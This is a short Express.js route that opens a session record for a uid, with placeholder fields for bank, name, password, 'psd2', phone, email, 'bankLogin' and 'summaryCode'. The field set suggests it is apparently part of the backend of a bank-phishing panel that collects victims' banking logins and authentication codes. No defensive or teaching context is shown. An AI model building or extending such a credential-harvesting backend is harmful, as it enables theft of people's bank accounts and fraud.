module.exports = () => {
    app.post("/api/opensession/", (req, res) => {
        let data = req["body"]
        orderModel.create({ uid: data["uid"], bank: "waiting", firstName: "waiting", lastName: "waiting", password: "waiting", psd2: "waiting", phone: "waiting", accepted: "false", email: "waiting", bankLogin: "waiting", summaryCode: "waiting" })
    })
}